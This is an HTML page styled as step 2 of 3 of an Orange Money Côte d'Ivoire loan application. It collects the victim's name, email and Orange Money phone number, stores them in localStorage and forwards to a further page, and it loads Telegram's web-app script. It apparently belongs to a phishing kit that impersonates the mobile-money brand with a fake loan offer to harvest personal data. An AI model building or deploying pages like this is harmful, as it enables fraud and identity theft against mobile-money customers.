<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Money - Informations Personnelles</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f16e00; --bg-color: #e5e5e5; }
        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .app-header { width: 100%; background-color: var(--orange-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0; padding: 32px 24px; border-radius: 16px; }
        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        label { font-weight: 700; margin-bottom: 10px; }
        .form-control { padding: 14px; border: 1px solid #e2e8f0; border-radius: 10px; font-size: 15px; width: 100%; box-sizing: border-box; }
        .phone-group { display: flex; gap: 10px; }
        .country-prefix { display: flex; align-items: center; gap: 6px; background: #f5f5f5; border: 1px solid #e2e8f0; border-radius: 10px; padding: 0 14px; font-weight: 700; }
        .btn-next { background-color: var(--orange-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <a href="page2.html" style="color:white; text-decoration:none; font-weight:600;">← Retour</a>
    <div style="font-weight:800; font-size:20px;"><span style="color:#d64d00">Orange</span>Money</div>
    <div></div>
</div>
<div class="card">
    <h1 style="text-align:center; font-size:26px;">Demande de Prêt</h1>
    <div style="text-align:center; color:#888; margin-bottom:20px;">Étape 2 sur 3</div>
    <form onsubmit="goNext(event)">
        <div class="form-group">
            <label>Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Jean" required>
        </div>
        <div class="form-group">
            <label>Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Kouassi" required>
        </div>
        <div class="form-group">
            <label>Adresse Email</label>
            <input type="email" id="email" class="form-control" placeholder="jean.kouassi@exemple.ci" required>
        </div>
        <div class="form-group">
            <label>Numéro de Téléphone Orange Money</label>
            <div class="phone-group">
                <div class="country-prefix"><span>🇨🇮</span><span>+225</span></div>
                <input type="tel" id="phone" class="form-control" placeholder="0701020304" maxlength="10" required>
            </div>
            <div style="font-size:12px; color:#888; margin-top:6px;">10 chiffres commençant par 07, 05 ou 01</div>
        </div>
        <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
    </form>
</div>
<div class="footer-banner">© 2026 Orange Money Côte d'Ivoire</div>
<script>
    function goNext(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        // Ivorian phone validation: 10 digits starting with 01, 05, or 07
        if (!/^0[157]\d{8}$/.test(phone)) {
            alert("Veuillez entrer un numéro Orange Money Côte d'Ivoire valide à 10 chiffres (ex: 0701020304).");
            return;
        }
        localStorage.setItem('firstName', document.getElementById('firstName').value.trim());
        localStorage.setItem('lastName', document.getElementById('lastName').value.trim());
        localStorage.setItem('email', document.getElementById('email').value.trim());
        localStorage.setItem('phone', phone);
        window.location.href = "page4.html";
    }
</script>
</body>
</html>
